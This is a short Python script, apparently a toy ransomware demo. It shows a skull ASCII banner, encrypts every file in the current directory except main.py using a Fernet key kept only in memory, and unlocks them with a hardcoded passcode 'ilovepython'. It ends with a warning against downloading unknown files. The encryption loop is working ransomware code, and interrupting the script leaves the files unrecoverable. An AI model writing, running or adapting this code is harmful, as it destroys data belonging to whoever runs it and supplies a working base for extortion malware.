import os
from cryptography.fernet import Fernet

print("*"*50)
print("*"*50)
print("""⠀    :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~ """)
print("*"*50)
print("*"*50)

print("if you exit the program your files are lost forever")
files=[]
for file in os.listdir():
    if file=="main.py" :
        continue
    if os.path.isfile(file):
        files.append(file)
key=Fernet.generate_key()

for file in files:
    with open(file,"rb") as readfile:
        content=readfile.read()
        enc_contents = Fernet(key).encrypt(content)
        with open(file, "wb") as writefile:
            writefile.write(enc_contents)

passcode="ilovepython"
while True:
    print("check the value of the file /data.txt/ to see how the program has encrypted it ")
    print("if you want the passcode go to https://telegram.me/pythonhomeworkbot or just type : ilovepython")
    if passcode==input("enter the passcode to decrypt your files :"):
        for file in files:
            with open(file, "rb") as readefile:
                contents = readefile.read()
            raw_contents = Fernet(key).decrypt(contents)
            with open(file, "wb") as writefile:
                writefile.write(raw_contents)
    print("passcode good dont download files from unknown resources ")
    break





